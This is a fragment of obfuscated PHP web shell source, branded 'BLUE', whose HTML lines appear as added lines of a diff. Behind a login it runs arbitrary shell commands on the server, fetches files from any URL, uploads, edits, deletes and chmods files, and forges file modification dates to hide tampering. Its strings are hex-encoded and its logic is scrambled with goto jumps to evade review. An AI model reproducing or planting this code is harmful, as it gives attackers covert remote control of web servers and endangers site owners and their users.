"\42\76\x3c\160\x61\x74\150\40\144\75\42\x4d\64\x20\65\150\x31\66\166\x31\x34\110\64\x7a\x22\x20\146\151\154\x6c\x3d\x22\143\x75\x72\162\145\156\164\103\x6f\x6c\157\162\42\40\x6f\160\x61\x63\151\x74\x79\x3d\x22\56\x31\62\x22\x2f\76\74\x63\151\162\143\154\145\40\x63\x78\75\42\70\56\65\x22\x20\x63\x79\75\x22\71\56\65\42\40\162\75\x22\61\56\65\x22\x20\x66\151\x6c\154\x3d\x22\x63\x75\x72\x72\x65\x6e\164\x43\x6f\x6c\x6f\162\x22\x2f\x3e\x3c\160\x61\164\150\40\144\x3d\x22\115\x34\40\61\x36\154\64\55\x34\x20\x33\40\63\x20\63\x2d\62\40\66\x20\x35\x22\40\146\151\x6c\x6c\x3d\x22\x6e\157\x6e\145\42\40\163\164\162\x6f\x6b\145\75\42\143\165\162\162\145\x6e\164\x43\x6f\x6c\x6f\162\x22\x20\x73\x74\162\x6f\153\x65\x2d\x77\151\144\x74\x68\x3d\x22\62\42\40\x73\164\162\x6f\153\x65\x2d\x6c\151\156\145\x63\141\x70\x3d\x22\162\x6f\165\156\144\42\57\76\74\x2f\163\x76\147\x3e", "\160\x64\146" => "\x3c\x73\166\x67\40\x76\151\145\167\102\x6f\170\x3d\x22\x30\40\60\x20\62\x34\40\x32\x34\x22\40\x63\154\141\x73\x73\x3d\42" . $class . "\x22\x3e\x3c\x70\x61\164\x68\40\x64\75\x22\115\x36\x20\63\x68\67\154\65\x20\65\166\x31\61\141\x32\x20\x32\x20\60\x20\x30\61\55\62\x20\62\x48\x36\x61\x32\40\62\40\x30\x20\x30\61\x2d\62\55\x32\x56\65\x22\x20\x66\151\x6c\x6c\x3d\42\x63\x75\162\162\145\156\164\x43\x6f\x6c\157\x72\x22\40\x6f\160\x61\x63\x69\164\x79\75\x22\x2e\61\x32\42\57\76\74\164\x65\170\164\x20\x78\75\42\67\x22\x20\171\x3d\x22\61\x37\42\x20\x66\157\156\x74\55\163\151\172\145\x3d\x22\70\x22\40\146\x6f\156\x74\x2d\x66\x61\x6d\151\x6c\x79\x3d\42\x75\151\55\x73\x61\x6e\163\55\x73\x65\x72\151\146\x22\40\146\151\x6c\x6c\x3d\x22\x63\x75\x72\162\145\156\x74\103\157\x6c\x6f\162\x22\x3e\x50\104\106\74\x2f\164\145\x78\x74\76\x3c\57\163\166\147\x3e", "\163\150\x65\x65\x74" => "\x3c\163\166\147\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\42\60\x20\60\x20\x32\64\40\62\64\42\x20\143\x6c\x61\x73\x73\75\42" . $class . "\x22\x3e\x3c\160\141\164\150\x20\x64\x3d\x22\x4d\x36\x20\63\150\61\62\141\62\x20\62\40\x30\40\x30\x31\62\x20\x32\x76\61\64\x61\x32\x20\62\x20\x30\40\60\x31\55\62\x20\x32\x48\66\x61\x32\x20\x32\40\60\x20\60\61\x2d\62\55\x32\x56\x35\x22\x20\146\x69\x6c\154\75\x22\143\165\162\162\x65\156\164\103\x6f\154\x6f\162\42\x20\x6f\160\141\143\151\164\171\75\x22\56\x31\62\x22\x2f\x3e\x3c\160\x61\164\x68\x20\x64\x3d\x22\x4d\x38\x20\70\150\x38\x4d\70\x20\x31\x32\x68\70\x4d\x38\x20\61\x36\x68\x38\42\40\x73\x74\x72\157\x6b\145\75\x22\x63\165\x72\162\x65\x6e\x74\x43\x6f\x6c\157\x72\42\x20\x73\164\162\x6f\153\x65\55\x77\x69\144\x74\x68\75\42\62\42\x2f\x3e\74\x2f\x73\166\x67\x3e", "\172\151\x70" => "\x3c\x73\166\x67\x20\166\x69\145\167\x42\x6f\170\x3d\x22\60\x20\x30\40\62\x34\40\x32\x34\x22\40\x63\154\x61\163\x73\75\x22" . $class . "\42\x3e\x3c\x70\x61\x74\150\x20\x64\x3d\42\x4d\66\40\63\150\x37\x6c\65\40\x35\x76\61\x31\141\x32\40\x32\40\x30\x20\x30\x31\55\62\40\x32\x48\66\141\x32\40\62\x20\60\40\60\61\55\x32\55\62\x56\x35\42\x20\146\151\x6c\x6c\75\x22\143\165\162\x72\x65\156\x74\x43\157\154\157\162\42\x20\157\160\141\x63\151\164\171\75\x22\x2e\61\x32\x22\57\x3e\74\x70\141\164\x68\x20\144\75\x22\115\x31\61\x20\x35\150\62\166\62\x68\55\x32\x76\x32\150\x32\166\62\150\55\62\x22\40\x73\x74\162\x6f\153\x65\x3d\42\x63\165\x72\162\145\x6e\x74\x43\157\154\x6f\162\x22\x20\163\x74\x72\157\x6b\x65\x2d\x77\151\144\x74\150\75\42\62\x22\x2f\x3e\x3c\57\163\x76\147\x3e", "\x64\x62" => "\x3c\163\166\x67\40\x76\151\145\167\x42\157\x78\x3d\x22\60\40\60\40\x32\64\x20\62\64\42\40\x63\x6c\x61\163\163\x3d\x22" . $class . "\42\76\x3c\145\x6c\154\x69\x70\163\x65\x20\x63\x78\x3d\x22\61\62\42\x20\143\x79\x3d\x22\x36\x22\40\x72\x78\75\x22\x38\42\x20\162\x79\75\x22\63\42\x20\x66\x69\x6c\154\x3d\x22\x63\165\x72\162\145\156\164\x43\x6f\x6c\x6f\x72\42\40\157\160\141\143\151\164\171\75\42\56\x31\x32\x22\x2f\76\74\160\141\x74\x68\40\x64\75\42\x4d\64\x20\x36\x76\x31\x32\x63\60\x20\x31\56\67\40\63\56\x36\x20\x33\x20\x38\40\63\x73\x38\55\x31\x2e\x33\x20\x38\x2d\63\x56\66\42\x20\146\151\154\x6c\x3d\x22\x6e\157\156\145\x22\x20\x73\164\162\157\x6b\145\x3d\x22\x63\165\162\162\145\156\164\x43\x6f\154\x6f\162\42\x20\x73\x74\162\x6f\153\x65\55\167\151\144\x74\150\x3d\x22\x32\x22\57\x3e\x3c\57\163\166\147\76", "\163\x65\141\x72\143\150" => "\x3c\163\166\x67\40\x76\x69\x65\x77\102\157\x78\75\42\60\40\x30\40\62\x34\40\62\64\x22\x20\x63\x6c\141\x73\163\75\42" . $class . "\x22\76\74\x63\151\162\143\154\x65\x20\x63\x78\75\42\x31\x31\x22\x20\143\171\75\42\61\61\42\x20\x72\x3d\x22\x37\42\40\x73\x74\162\157\x6b\x65\x3d\x22\143\165\x72\162\145\156\x74\103\x6f\154\157\x72\x22\40\163\164\162\x6f\x6b\x65\55\167\151\144\x74\x68\x3d\x22\62\x22\x20\146\x69\x6c\x6c\75\42\156\157\156\x65\42\x2f\76\74\x70\141\x74\x68\x20\144\x3d\42\x4d\x32\60\x20\x32\x30\154\x2d\63\x2d\x33\x22\x20\163\x74\162\x6f\153\x65\75\42\x63\x75\x72\x72\145\156\x74\x43\x6f\x6c\157\162\x22\40\163\x74\x72\157\153\x65\x2d\x77\151\x64\x74\x68\x3d\x22\62\x22\40\x73\x74\162\157\153\145\55\x6c\x69\156\145\x63\x61\160\x3d\x22\x72\x6f\165\x6e\144\42\57\x3e\74\57\163\166\147\x3e"); return isset($icons[$name]) ? $icons[$name] : $icons["\x66\x69\154\x65"]; } goto ovRk7; XQbcw: if ($_SERVER["\122\105\x51\125\x45\x53\124\137\x4d\x45\124\x48\x4f\x44"] === "\120\x4f\x53\124") { ensureCsrf(); $back = function () use($current) { header("\114\157\x63\x61\x74\x69\157\x6e\72\40\77\x70\x3d" . rawurlencode($current)); die; }; switch ($action) { case "\x6c\x6f\147\x6f\165\164": session_destroy(); header("\114\x6f\143\141\x74\x69\157\x6e\x3a\x20\77"); die; case "\x6e\x65\x77\x2d\146\151\154\145": $name = trim((string) (isset($_POST["\156\x61\155\x65"]) ? $_POST["\x6e\141\x6d\x65"] : '')); $content = isset($_POST["\143\x6f\156\164\x65\x6e\164"]) ? (string) $_POST["\143\157\156\x74\145\156\x74"] : null; if ($name === '' || strpos($name, DIRECTORY_SEPARATOR) !== false) { $_SESSION["\x6d\x73\x67"] = "\116\x65\x77\x20\x46\x69\154\145\72\x20\151\156\x76\141\154\x69\144\x20\x6e\141\x6d\145"; return $back(); } $dst = safeJoin($current, $name); if (file_exists($dst)) { $_SESSION["\155\163\147"] = "\x4e\x65\x77\40\x46\x69\x6c\145\x3a\40\x61\154\x72\x65\x61\x64\171\40\x65\x78\151\163\164\163"; return $back(); } list($ok, $how) = create_nonzero_file($dst, $content); $_SESSION["\155\x73\x67"] = $ok ? "\x4e\x65\x77\40\106\x69\x6c\x65\40\117\113\40\x76\x69\141\x20{$how}\x3a\40" . $name : "\116\145\167\40\x46\x69\154\x65\x20\146\x61\x69\x6c\145\144\72\40" . $how; return $back(); case "\156\x65\x77\55\x64\x69\162": $name = trim((string) (isset($_POST["\x6e\x61\155\x65"]) ? $_POST["\156\141\155\145"] : '')); if ($name === '' || strpos($name, DIRECTORY_SEPARATOR) !== false) { $_SESSION["\155\x73\147"] = "\x4e\x65\x77\40\x46\157\154\144\x65\162\x3a\40\x69\156\x76\x61\x6c\151\x64\40\x6e\141\155\x65"; return $back(); } $dst = safeJoin($current, $name); if (file_exists($dst)) { $_SESSION["\155\163\147"] = "\116\145\167\x20\x46\157\154\x64\145\x72\x3a\x20\141\x6c\162\x65\x61\x64\x79\40\x65\x78\151\x73\164\163"; return $back(); } $ok = @mkdir($dst, 509, false); $_SESSION["\155\163\147"] = $ok ? "\116\x65\167\40\106\157\x6c\144\x65\162\x20\x4f\113\72\x20" . $name : "\x4e\x65\x77\40\x46\157\x6c\x64\145\162\x20\x66\x61\151\154\x65\144"; return $back(); case "\145\x64\x69\x74\55\163\141\166\x65": $file = safeJoin($current, isset($_POST["\146\151\x6c\x65"]) ? $_POST["\146\x69\154\x65"] : ''); $content = isset($_POST["\x63\157\x6e\x74\145\156\164"]) ? $_POST["\x63\x6f\x6e\x74\145\x6e\x74"] : ''; $mode = isset($_POST["\155\157\144\x65"]) ? $_POST["\x6d\157\x64\x65"] : "\x74\x78\164"; if (!is_file($file) || !is_writable($file)) { $_SESSION["\155\163\147"] = "\123\x61\166\145\x20\146\141\151\154\x65\144\x20\50\146\151\154\145\x20\156\157\164\40\167\x72\151\164\141\142\154\145\51"; return $back(); } if ($mode === "\142\x36\64") { $data = base64_decode($content, true); if ($data === false) { $_SESSION["\x6d\163\x67"] = "\x53\x61\166\x65\40\146\x61\x69\x6c\x65\144\72\40\x69\156\x76\x61\x6c\151\x64\40\102\141\x73\x65\66\64\40\144\x61\164\x61"; return $back(); } @file_put_contents($file, $data); } else { @file_put_contents($file, $content); } $_SESSION["\155\x73\147"] = "\x53\x61\166\x65\x64\72\x20" . basename($file); return $back(); case "\x72\x65\x6e\141\155\145": $old = safeJoin($current, isset($_POST["\x6f\154\144"]) ? $_POST["\x6f\x6c\144"] : ''); $new = trim((string) (isset($_POST["\x6e\145\167"]) ? $_POST["\156\x65\167"] : '')); if ($new === '' || strpos($new, DIRECTORY_SEPARATOR) !== false) { $_SESSION["\x6d\x73\147"] = "\111\156\166\141\154\x69\144\40\x6e\x65\167\x20\x6e\141\x6d\145"; } else { $dst = safeJoin($current, $new); $_SESSION["\155\x73\147"] = @rename($old, $dst) ? "\x52\145\156\141\x6d\145\x20\x4f\x4b" : "\122\x65\x6e\x61\x6d\x65\40\x66\141\x69\154\x65\x64"; } return $back(); case "\x63\150\155\x6f\x64": $target = safeJoin($current, isset($_POST["\164\x61\162\x67\x65\x74"]) ? $_POST["\164\141\162\147\145\x74"] : ''); $mode = modeFromInput((string) (isset($_POST["\155\x6f\144\145"]) ? $_POST["\x6d\x6f\144\x65"] : "\x30\x36\x34\x34")); $rec = !empty($_POST["\162\x65\x63\x75\162\x73\151\166\x65"]); $ok = true; biru_apply_chmod($target, $mode, $rec, $ok); $_SESSION["\x6d\x73\147"] = $ok ? "\x43\150\x6d\157\x64\40\117\x4b" : "\103\x68\155\x6f\144\40\x70\141\x72\164\151\141\154\x6c\171\x20\x66\x61\151\x6c\x65\x64"; return $back(); case "\x64\145\154\145\164\x65": $t = safeJoin($current, isset($_POST["\164\141\162\x67\x65\164"]) ? $_POST["\x74\141\x72\147\145\x74"] : ''); $_SESSION["\x6d\x73\x67"] = rrmdir($t) ? "\104\145\x6c\145\164\x65\40\x4f\113" : "\x44\x65\x6c\x65\x74\145\x20\x66\141\151\x6c\145\144"; return $back(); case "\155\x61\163\163\x2d\x64\x65\154\145\164\145": $arr = isset($_POST["\x69\164\x65\x6d\163"]) ? $_POST["\x69\164\x65\155\163"] : array(); $ok = true; if (is_array($arr)) { foreach ($arr as $n) { $ok = rrmdir(safeJoin($current, $n)) && $ok; } } $_SESSION["\x6d\163\x67"] = $ok ? "\x42\x75\x6c\153\40\x64\x65\x6c\145\164\145\40\x4f\x4b" : "\123\x6f\x6d\145\40\151\164\x65\155\x73\40\146\x61\x69\x6c\145\x64\40\x74\x6f\40\x64\145\154\x65\164\x65"; return $back(); case "\x75\x70\x6c\157\x61\x64": if (!isset($_FILES["\146\151\x6c\x65\163"])) { $_SESSION["\155\x73\x67"] = "\x4e\x6f\x20\x66\x69\154\x65\x73\x20\x70\x72\157\x76\151\x64\x65\144"; return $back(); } $c = count($_FILES["\146\151\154\145\163"]["\156\141\155\x65"]); $ok = 0; $fail = 0; $fails = array(); for ($i = 0; $i < $c; $i++) { $name = $_FILES["\x66\x69\154\x65\163"]["\x6e\x61\x6d\145"][$i]; $tmp = $_FILES["\x66\151\154\145\163"]["\x74\x6d\x70\x5f\156\x61\x6d\x65"][$i]; $e = $_FILES["\x66\x69\x6c\145\163"]["\x65\162\x72\157\x72"][$i]; if ($e !== UPLOAD_ERR_OK) { $fail++; $fails[] = "{$name}\40\50\x65\x72\x72\x6f\x72\x20{$e}\x29"; continue; } list($done, $why) = tryWriteFromTmp($tmp, safeJoin($current, $name)); if ($done) { $ok++; } else { $fail++; $fails[] = "{$name}\40\x28{$why}\51"; } } $_SESSION["\155\x73\147"] = "\x55\x70\154\x6f\141\144\72\40\117\113\75{$ok}\x3b\x20\x46\x61\151\x6c\x65\144\75{$fail}" . ($fails ? "\73\40" . implode("\54\40", $fails) : ''); return $back(); case "\165\x72\154\55\x75\x70\154\157\141\x64": $url = trim((string) (isset($_POST["\x75\162\x6c"]) ? $_POST["\165\x72\154"] : '')); $fn = trim((string) (isset($_POST["\146\151\154\145\x6e\141\155\x65"]) ? $_POST["\x66\151\154\x65\156\x61\155\x65"] : '')); if ($url === '') { $_SESSION["\155\163\x67"] = "\x55\122\114\40\x69\163\40\145\x6d\x70\164\x79"; return $back(); } if ($fn === '') { $path = parse_url($url, PHP_URL_PATH); $fn = basename($path ? $path : ''); if ($fn === '') { $fn = "\x64\157\167\156\154\157\x61\x64\56\142\x69\x6e"; } } list($ok, $w) = fetchUrlToFile($url, safeJoin($current, $fn)); $_SESSION["\x6d\163\147"] = $ok ? "\x44\x6f\x77\156\x6c\157\141\x64\145\144\40\146\x72\157\155\40\125\122\114\72\x20{$fn}" : "\x55\122\114\x20\x64\x6f\x77\x6e\154\x6f\x61\x64\40\146\141\x69\x6c\x65\144\x3a\40{$w}"; return $back(); case "\x6d\164\x69\155\x65": $target = safeJoin($current, isset($_POST["\x74\x61\162\x67\145\164"]) ? $_POST["\x74\141\x72\147\x65\164"] : ''); $input = trim((string) (isset($_POST["\x74\x73"]) ? $_POST["\x74\163"] : '')); $rec = !empty($_POST["\162\x65\x63\165\x72\163\x69\166\x65"]); if ($input === '') { $_SESSION["\155\163\147"] = "\103\x68\141\156\x67\145\x20\104\x61\x74\145\x3a\40\145\x6d\160\x74\171"; return $back(); } if (ctype_digit($input)) { $ts = (int) $input; } else { $ts = @strtotime($input); if ($ts === false) { $_SESSION["\155\163\147"] = "\103\150\141\x6e\x67\x65\40\x44\141\x74\145\72\40\151\x6e\x76\x61\154\x69\x64\x20\x74\151\155\x65\x20\146\x6f\x72\x6d\x61\x74"; return $back(); } } $ok = true; biru_apply_mtime($target, $ts, $rec, $ok); $_SESSION["\x6d\x73\147"] = $ok ? "\x43\150\x61\x6e\x67\145\x20\x44\x61\x74\x65\x20\x4f\113\x20\342\206\222\x20" . date("\131\x2d\x6d\x2d\x64\x20\x48\x3a\151\x3a\x73", $ts) : "\x43\150\141\x6e\147\145\40\104\141\164\x65\x20\x70\141\162\x74\x69\141\x6c\x6c\x79\40\x66\141\151\x6c\x65\x64"; return $back(); case "\143\x6d\144": $cmd = trim((string) (isset($_POST["\143\155\x64"]) ? $_POST["\143\155\x64"] : '')); if ($cmd === '') { $_SESSION["\x6d\x73\x67"] = "\x43\157\155\155\x61\156\144\40\151\163\x20\x65\155\x70\x74\171\56"; return $back(); } $result = run_command_all($cmd, $current); $out = (string) $result["\x6f\165\164"]; if (strlen($out) > 1024 * 1024) { $out = substr($out, 0, 1024 * 1024) . "\xa\x5b\x6f\x75\x74\x70\x75\x74\40\164\162\165\156\x63\x61\x74\x65\144\x5d"; } $_SESSION["\x63\x6d\x64\137\x72\x65\x73\x75\154\x74"] = array("\143\155\x64" => $cmd, "\155\145\x74\x68\x6f\144" => $result["\x6d\145\164\x68\157\x64"], "\143\157\x64\x65" => $result["\x63\157\x64\145"], "\157\165\164" => $out); return $back(); case "\x6d\x6f\166\x65": $srcName = (string) (isset($_POST["\x73\162\143"]) ? $_POST["\163\x72\143"] : ''); $dstDir = (string) (isset($_POST["\x64\x73\164"]) ? $_POST["\144\x73\164"] : ''); $srcFull = safeJoin($current, $srcName); if ($srcName === '' || !file_exists($srcFull)) { $_SESSION["\155\x73\x67"] = "\x4d\157\166\x65\x20\146\141\151\x6c\x65\144\x3a\x20\x73\x6f\x75\x72\x63\145\x20\155\x69\x73\x73\x69\x6e\x67"; return $back(); } if ($dstDir === '') { $_SESSION["\x6d\163\x67"] = "\115\157\166\x65\40\x66\x61\151\x6c\145\144\72\x20\144\145\163\x74\151\156\x61\x74\x69\157\x6e\40\x65\155\x70\x74\171"; return $back(); } if (!is_dir($dstDir)) { $_SESSION["\x6d\163\147"] = "\x4d\x6f\x76\x65\40\x66\x61\151\x6c\x65\144\x3a\x20\x64\145\x73\164\x69\x6e\141\164\151\x6f\156\40\151\163\x20\x6e\157\164\40\141\x20\144\151\162\145\143\164\x6f\162\171"; return $back(); } $dstFull = safeJoin($dstDir, basename($srcName)); if (@realpath($srcFull) === @realpath($dstFull)) { $_SESSION["\155\x73\147"] = "\115\157\166\145\x20\x73\x6b\x69\160\160\145\144\40\x28\x73\141\x6d\x65\40\x6c\157\x63\141\164\x69\x6f\156\x29"; return $back(); } $ok = @rename($srcFull, $dstFull); $_SESSION["\x6d\163\147"] = $ok ? "\115\x6f\166\x65\x20\117\x4b" : "\115\x6f\x76\x65\x20\146\x61\x69\x6c\x65\144"; return $back(); case "\172\x69\160": $items = isset($_POST["\x69\x74\x65\x6d\163"]) ? $_POST["\x69\164\145\155\x73"] : array(); $name = trim((string) (isset($_POST["\172\151\x70\x6e\x61\x6d\x65"]) ? $_POST["\172\x69\160\x6e\141\x6d\145"] : '')); if (!is_array($items) || empty($items)) { $_SESSION["\x6d\163\147"] = "\x5a\151\x70\40\x66\141\x69\x6c\145\x64\72\40\x6e\x6f\164\150\x69\x6e\x67\x20\163\x65\154\145\x63\164\x65\144"; return $back(); } if ($name === '') { $name = "\141\162\143\x68\151\166\x65\55" . date("\x59\x6d\144\55\x48\151\x73") . "\x2e\172\x69\x70"; } $archivePath = safeJoin($current, $name); $done = false; $err = ''; if (class_exists("\132\151\160\x41\162\x63\150\151\x76\145")) { $zip = new ZipArchive(); if ($zip->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) { foreach ($items as $it) { $full = safeJoin($current, $it); if (is_dir($full)) { $itClean = rtrim($it, DIRECTORY_SEPARATOR); addDirToZip($zip, $full, $itClean); } elseif (is_file($full)) { $zip->addFile($full, basename($it)); } } $zip->close(); $done = true; } else { $err = "\x5a\151\160\101\x72\143\150\x69\166\145\x20\x6f\x70\145\x6e\40\x66\141\x69\154\x65\x64"; } } if (!$done) { if (class_exists("\x50\150\x61\x72\104\x61\x74\x61")) { try { $tarName = preg_replace("\x7e\x5c\56\172\x69\160\x24\x7e\151", "\56\x74\x61\162", $archivePath); $phar = new PharData($tarName); foreach ($items as $it) { $full = safeJoin($current, $it); if (is_dir($full)) { $phar->addEmptyDir(basename($it)); addDirToPhar($phar, $full, basename($it)); } elseif (is_file($full)) { $phar->addFile($full, basename($it)); } } unset($phar); $_SESSION["\155\x73\147"] = "\132\151\160\101\x72\x63\x68\x69\x76\x65\x20\x6e\157\164\x20\141\166\141\151\x6c\x61\142\x6c\x65\73\x20\143\x72\145\x61\164\x65\x64\x20\124\x41\122\x20\x69\x6e\x73\164\x65\x61\x64\x3a\x20" . basename($tarName); return $back(); } catch (Exception $e) { $err = "\124\101\122\x20\146\x61\154\154\142\x61\x63\153\x20\146\141\x69\x6c\145\144\x3a\x20" . $e->getMessage(); } } else { $err = ($err ? $err . "\73\x20" : '') . "\116\x6f\40\132\151\160\x41\x72\x63\x68\151\166\x65\40\156\157\x72\40\120\x68\x61\162\x44\x61\x74\141\x20\x61\x76\x61\151\x6c\x61\x62\x6c\145"; } } $_SESSION["\155\163\147"] = $done ? "\101\x72\143\150\x69\x76\145\40\x63\162\x65\141\x74\x65\144\x3a\x20" . basename($archivePath) : "\132\x69\160\40\146\x61\151\x6c\x65\x64\72\40" . $err; return $back(); case "\165\156\x7a\151\x70": $file = safeJoin($current, isset($_POST["\x66\x69\154\145"]) ? $_POST["\146\151\x6c\145"] : ''); if (!is_file($file)) { $_SESSION["\155\163\147"] = "\125\156\x7a\x69\160\40\x66\x61\x69\x6c\x65\x64\x3a\x20\146\151\x6c\145\40\156\157\164\40\x66\x6f\165\156\144"; return $back(); } $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); $ok = false; $err = ''; if ($ext === "\x7a\x69\160" && class_exists("\132\151\160\x41\x72\x63\150\x69\x76\145")) { $zip = new ZipArchive(); if ($zip->open($file) === true) { $ok = $zip->extractTo($current); $zip->close(); if (!$ok) { $err = "\132\x69\x70\x20\x65\x78\164\x72\141\x63\x74\x54\157\x20\146\x61\151\x6c\145\144"; } } else { $err = "\x5a\x69\160\x20\x6f\160\145\x6e\x20\146\141\x69\154\145\x64"; } } else { try { if (class_exists("\120\x68\x61\x72\x44\x61\164\141") && preg_match("\x7e\x5c\x2e\x28\164\x61\x72\x7c\x74\x61\162\134\x2e\147\x7a\174\164\141\x72\134\56\142\172\x32\174\164\141\x72\x5c\x2e\x78\x7a\51\x24\x7e\x69", $file)) { $phar = new PharData($file); $phar->extractTo($current, null, true); $ok = true; } else { $err = "\x55\x6e\x73\165\x70\x70\157\x72\164\145\144\40\141\x72\x63\x68\151\x76\x65\x20\164\x79\x70\145\40\157\162\x20\x50\x68\141\x72\x44\141\164\141\40\156\157\164\x20\141\x76\141\151\154\x61\x62\x6c\x65"; } } catch (Exception $e) { $err = $e->getMessage(); } } $_SESSION["\x6d\x73\x67"] = $ok ? "\x55\x6e\172\151\160\x20\117\113" : "\125\x6e\x7a\151\x70\x20\x66\x61\151\x6c\145\x64\x3a\x20" . $err; return $back(); } } goto BkxhG; oMJcx: echo je($viewFile ? basename($viewFile) : ''); goto mvPSY; aFily: ?>
+</div>
+        <div>
+          <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">BLUE</a></div>
+          <div class="text-xs text-slate-400">PHP <?php  goto HBaGf; nq0eq: ?>
+">
+          <div class="flex gap-2">
+            <button class="btn btnw" type="submit">Go</button>
+            <a class="btn btnw" href="?">Go to CWD</a>
+          </div>
+        </form>
+      </section>
+
+      <!-- CREATE: New File / New Folder -->
+      <section class="card p-4">
+        <h2 class="font-medium mb-3">Create</h2>
+
+        <form method="post" action="?a=new-file&p=<?php  goto e4atL; nCFqh: if ($action === "\144\157\x77\x6e\154\x6f\141\x64") { $f = safeJoin($current, isset($_GET["\x66"]) ? $_GET["\x66"] : ''); if (!is_file($f) || !is_readable($f)) { http_response_code(404); die("\116\157\164\40\146\x6f\x75\x6e\144"); } header("\x43\x6f\156\x74\x65\156\x74\x2d\x44\x65\x73\x63\162\151\160\x74\x69\x6f\x6e\x3a\x20\x46\151\x6c\145\40\x54\162\141\156\x73\x66\145\x72"); header("\103\157\156\x74\x65\x6e\164\55\x54\171\x70\x65\x3a\40\141\160\x70\x6c\151\x63\141\164\151\157\x6e\x2f\x6f\143\164\145\164\55\x73\x74\x72\x65\x61\155"); header("\103\x6f\x6e\x74\x65\x6e\x74\55\x44\151\x73\x70\x6f\163\x69\x74\151\x6f\x6e\72\40\x61\x74\x74\141\x63\x68\x6d\145\156\x74\73\x20\146\151\x6c\145\156\141\155\145\x3d\x22" . basename($f) . "\x22"); header("\x43\157\x6e\x74\145\156\164\x2d\114\x65\156\x67\x74\x68\x3a\x20" . filesize($f)); header("\130\55\x43\157\x6e\164\145\156\164\x2d\x54\x79\160\145\x2d\x4f\160\164\x69\157\156\163\x3a\x20\156\157\x73\x6e\x69\x66\146"); readfile($f); die; } goto S6u5z; FRzj3: echo je($current . DIRECTORY_SEPARATOR); goto bkGnY; vl0u3: ?>
+">
+              <input type="text" name="zipname" class="field w-56" placeholder="archive-name.zip (optional)">
+              <button class="btn btn-sm btnw" type="submit" onclick="return collectSelectedInto(this.form)">Zip Selected</button>
+              <span class="text-xs text-slate-400">
+                If ZipArchive is unavailable, a <span class="mono">.tar</span> will be created (no compression).
+              </span>
+            </form>
+          </div>
+        </form>
+      </div>
+    </section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="w-full px-6 py-4">
+    <div class="footer-line mb-3"></div>
+    <div class="text-xs text-slate-400 flex items-center justify-between">
+      <span>© <?php  goto mqtcV; UxSvF: session_start(); goto NJQ_0; ZjMaL: function biru_password_verify($password, $hash) { if (is_fn_usable("\x70\x61\163\x73\x77\157\x72\x64\137\166\x65\x72\x69\146\x79")) { return password_verify($password, $hash); } if (strlen($hash) >= 60 && $hash[0] . $hash[1] === "\x24\x32") { return crypt($password, $hash) === $hash; } return false; } goto qME6W; A0s3c: header("\x52\145\x66\145\162\162\145\162\55\x50\x6f\154\x69\143\x79\72\x20\x6e\157\x2d\x72\x65\146\x65\162\x72\145\162"); goto tP2Ju; lQCyk: $files = array(); goto iMtWO; uGEIE: ?>
+"
+                  class="inline-flex flex-wrap gap-2 items-center">
+              <input type="hidden" name="csrf" value="<?php  goto x45KM; BO4BT: ?>
+
+                <?php  goto Hx5jU; DiQC3: ?>
+">
+          <div class="mb-3 flex flex-wrap gap-2">
+            <button class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete all selected items?')">Delete Selected</button>
+            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
+            <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>
+
+            <div class="hidden md:flex items-center gap-2 ml-auto text-xs text-slate-400">
+              <span>Sort:</span>
+              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('name')">Name</button>
+              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('size')">Size</button>
+              <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('mtime')">Modified</button>
+            </div>
+
+            <!-- Toggle drag-to-move (default OFF) -->
+            <label class="flex items-center gap-2 text-xs text-slate-300 ml-2">
+              <input id="dragToggle" type="checkbox" class="accent-indigo-500">
+              Enable drag-to-move
+            </label>
+          </div>
+
+          <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
+            <table id="dirTable" class="tbl min-w-full text-sm">
+              <thead class="text-left border-b border-slate-700">
+                <tr>
+                  <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
+                  <th class="py-2 px-2">Name</th>
+                  <th class="py-2 px-2">Size</th>
+                  <th class="py-2 px-2">Perms</th>
+                  <th class="py-2 px-2">Modified</th>
+                  <th class="py-2 px-2">Actions</th>
+                </tr>
+              </thead>
+              <tbody id="dirBody">
+                <?php  goto KiYAP; BkxhG: function addDirToZip($zip, $dir, $local) { $dir = rtrim($dir, DIRECTORY_SEPARATOR); if (method_exists($zip, "\141\x64\x64\105\155\x70\164\171\x44\x69\162")) { $zip->addEmptyDir($local); } $h = @opendir($dir); if (!$h) { return; } while (false !== ($e = readdir($h))) { if ($e === "\x2e" || $e === "\56\x2e") { continue; } $full = $dir . DIRECTORY_SEPARATOR . $e; $localPath = $local . "\57" . basename($e); if (is_dir($full)) { addDirToZip($zip, $full, $localPath); } elseif (is_file($full) && method_exists($zip, "\x61\144\144\x46\x69\x6c\145")) { $zip->addFile($full, $localPath); } } closedir($h); } goto sTK0e; pT1kW: if ($current === '') { $current = DIRECTORY_SEPARATOR; } goto fav_v; eCX9G: if (!function_exists("\x66\170\137\x70\157\x70\145\x6e")) { function fx_popen($cmd, $mode) { if (is_fn_usable("\x70\x6f\160\x65\x6e")) { return @popen($cmd, $mode); } return false; } } goto UQ6PH; jl6mz: ?>
+" class="space-y-2">
